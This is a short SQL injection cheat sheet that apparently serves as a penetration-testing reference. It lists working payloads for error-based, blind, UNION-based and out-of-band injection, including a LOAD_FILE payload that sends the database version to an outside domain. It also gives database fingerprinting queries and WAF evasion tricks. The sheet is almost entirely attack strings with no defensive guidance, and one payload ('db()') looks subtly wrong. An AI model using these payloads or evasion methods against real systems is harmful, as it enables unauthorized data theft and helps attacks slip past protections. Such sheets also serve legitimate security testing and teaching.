# Standards Reference

## SQL Injection Types
| Type | Detection | Technique |
|------|-----------|-----------|
| Error-based | Database error in response | `') OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -` |
| Boolean-blind | Response difference | `' AND SUBSTRING((SELECT db()),1,1)='m'-- -` |
| Time-blind | Response delay | `' UNION SELECT IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)-- -` |
| UNION-based | Extra rows in result | `' UNION SELECT 1,2,3,table_name FROM information_schema.tables-- -` |
| Out-of-band | External interaction | `LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.\<domain>\\test'))` |

## Database Fingerprinting
| DBMS | Version Query | System Table |
|------|---------------|--------------|
| MySQL | `@@version` | information_schema |
| PostgreSQL | `version()` | pg_catalog |
| MSSQL | `@@VERSION` | INFORMATION_SCHEMA |
| Oracle | `SELECT * FROM v$version` | ALL_TABLES |
| SQLite | `sqlite_version()` | sqlite_master |

## WAF Evasion Techniques
- Case variation: `UnIoN SeLeCt`
- Comment insertion: `UN/**/ION/**/SEL/**/ECT`
- Hex encoding: `0x73656c656374`
- Double URL encoding: `%2553%2545%254c`
- Null byte injection: `%00' UNION SELECT-- -`
- HTTP parameter pollution: `?id=1&id=2&id=3`

## References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- SQLMap User Guide: https://github.com/sqlmapproject/sqlmap/wiki
